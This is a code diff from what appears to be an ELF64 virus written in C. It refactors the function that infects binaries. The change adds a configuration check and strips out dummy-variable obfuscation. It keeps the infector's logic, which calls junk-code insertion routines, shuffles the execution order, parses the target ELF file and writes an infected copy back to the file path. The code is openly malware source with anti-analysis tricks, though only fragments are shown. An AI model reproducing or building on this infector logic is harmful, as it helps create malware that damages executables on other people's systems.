@@ -22,22 +22,21 @@ static int write_infected_file(const char *filepath, void *data, size_t size)
 	return 0;
 }
 
-int infect_binary(const char *filepath)
+int infect_elf64(const char *filepath, t_config *config)
 {
 	t_elf elf = {0};
 	void *new_data = NULL;
 	size_t new_size;
 	size_t original_size;
-	long long save;
 	Elf64_Ehdr *new_ehdr;
 	Elf64_Phdr *new_phdr;
 	Elf64_Shdr *new_shdr;
 	int ret = -1;
 
-	save = pepino;
+	if (!config->modify_signature)
+		return -1;
 	insert_garbage();
 	int order = get_execution_order();
-	pepino *= 11;
 
 	if (order == 0 || order == 1)
 	{
@@ -45,7 +44,6 @@ int infect_binary(const char *filepath)
 			return -1;
 		insert_garbage3();
 	}
-	pepino += 23432;
 	if (order == 2 || order == 3)
 	{
 		if (parse_elf(filepath, &elf) < 0)
@@ -236,7 +234,5 @@ int infect_binary(const char *filepath)
 	ret = write_infected_file(filepath, new_data, new_size);
 	free(new_data);
 
-	pepino = save;
-	pepino *= 1;
 	return ret;
 }
